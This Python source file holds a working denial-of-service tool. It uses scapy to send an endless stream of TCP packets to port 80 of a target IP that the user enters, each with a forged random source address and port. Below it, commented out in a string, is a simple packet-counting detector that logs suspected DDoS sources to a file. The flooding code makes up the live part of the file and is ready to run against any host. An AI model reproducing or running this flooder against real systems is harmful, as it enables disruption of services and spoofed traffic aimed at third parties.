import random
from scapy.all import *

def ddos(target):
    i=1
    while(1): 
        bit_0_8=str(random.randint(1,254))
        bit_8_16=str(random.randint(1,254))
        bit_16_24=str(random.randint(1,254))
        bit_24_32=str(random.randint(1,254))
        fakeIP=bit_0_8+"."+bit_8_16+"."+bit_16_24+"."+bit_24_32
        randPort=random.randint(1,65535)
        ip=IP(src=fakeIP, dst=target)
        tcp=TCP(sport=randPort, dport=80)
        pkt=ip/tcp
        send(pkt, inter= .0001)
        print "packet sent : ", i
        i+=1
          
def main():
    target=raw_input("Input Target IP : ")
    ddos(target)
    
if __name__=="__main__":
    main()
'''
import socket, struct
from datetime import datetime 

def detectDDOS():
    s=socket.socket(socket.PF_PACKET, socket.SOCK_RAW, 8)
    dict={}
    file_txt=open("dos.txt", 'a')
    file_txt.writelines("**********")
    t1=str(datetime.now())
    file_txt.writelines(t1)
    file_txt.writelines("**********")
    file_txt.writelines("\n")
    print "Detection Start ......."
    D_val=10
    D_val1=D_val+10
    while True:
        pkt=s.recvfrom(100)
        ipheader=pkt[0][14:34]
        ip_hdr=struct.unpack("!8sB3s4s4s",ipheader)
        IP=socket.inet_ntoa(ip_hdr[3])
        print "Source IP", IP
        if dict.has_key(IP):
            dict[IP]=dict[IP]+1
            print dict[IP]
            if(dict[IP]>D_val) and (dict[IP]<D_val1) :         
                    line = "DDOS Detected "
                    file_txt.writelines(line)
                    file_txt.writelines(IP)
                    file_txt.writelines("\n")
        else:
            dict[IP]=1
        
def main():
    detectDDOS()
    
if __name__=="__main__":
    main()
'''